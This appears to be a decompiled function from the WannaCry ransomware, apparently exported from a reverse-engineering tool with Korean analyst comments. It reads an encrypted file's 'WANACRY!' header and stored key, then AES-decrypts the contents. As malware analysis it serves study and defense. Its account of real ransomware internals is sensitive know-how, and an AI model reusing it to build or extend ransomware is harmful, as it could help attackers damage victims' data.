// --- Metadata ---
// Function Name: decryptWannaCrytFiles_4014A6
// Address: 0x4014A6
// Exported At: 20250515_225255
// Signature: unknown_signature
// ---------------
int __thiscall decryptWannaCrytFiles_4014A6(void **this, LPCSTR lpFileName, int a3)
{
  int v4; // ebx
  HANDLE v5; // edi
  size_t Size; // [esp+14h] [ebp-244h] BYREF
  int Buffer; // [esp+18h] [ebp-240h] BYREF
  char Buf1; // [esp+1Ch] [ebp-23Ch] BYREF
  int v10; // [esp+1Dh] [ebp-23Bh]
  __int16 v11; // [esp+21h] [ebp-237h]
  char v12; // [esp+23h] [ebp-235h]
  __int64 dwBytes; // [esp+24h] [ebp-234h] BYREF
  int keyvalue[128]; // [esp+2Ch] [ebp-22Ch] BYREF
  int v15; // [esp+22Ch] [ebp-2Ch] BYREF
  int v16; // [esp+230h] [ebp-28h]
  LARGE_INTEGER FileSize; // [esp+234h] [ebp-24h] BYREF
  DWORD NumberOfBytesRead; // [esp+23Ch] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+240h] [ebp-18h] BYREF

  v4 = 0;
  v15 = 0;
  Size = 0;
  Buf1 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  Buffer = 0;
  NumberOfBytesRead = 0;
  ms_exc.registration.TryLevel = 0;
  v5 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
  if ( v5 != -1 )
  {
    GetFileSizeEx(v5, &FileSize);
    if ( FileSize.QuadPart <= 104857600 )       // 100mb 이상 파일은 무시함 
    {
      if ( ReadFile_0(v5, &Buf1, 8u, &NumberOfBytesRead, 0) )
      {
        if ( !memcmp(&Buf1, "WANACRY!", 8u) )   // 암호화된 파일 헤더에 남는 WANACRY!라는 서명 확인 
        {
          if ( ReadFile_0(v5, &Size, 4u, &NumberOfBytesRead, 0) )
          {
            if ( Size == 256 )
            {
              if ( ReadFile_0(v5, this[306], 0x100u, &NumberOfBytesRead, 0) )
              {
                if ( ReadFile_0(v5, &Buffer, 4u, &NumberOfBytesRead, 0) )
                {
                  if ( ReadFile_0(v5, &dwBytes, 8u, &NumberOfBytesRead, 0) )
                  {
                    if ( dwBytes <= 104857600 )
                    {
                      if ( cipher_criticalSection_4019E1((this + 1), this[306], Size, keyvalue, &v15) )
                      {
                        AESKeySchedule_402A76((this + 21), keyvalue, Src, v15, 0x10u);
                        v16 = GlobalAlloc(0, dwBytes);
                        if ( v16 )
                        {
                          if ( ReadFile_0(v5, this[306], FileSize.LowPart, &NumberOfBytesRead, 0)
                            && NumberOfBytesRead
                            && NumberOfBytesRead >= dwBytes )
                          {
                            v4 = v16;
                            AES_EncryptDecrypt_403A77((this + 21), this[306], v16, NumberOfBytesRead, 1);
                            *a3 = dwBytes;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&ms_exc.registration, -1);
  return v4;
}
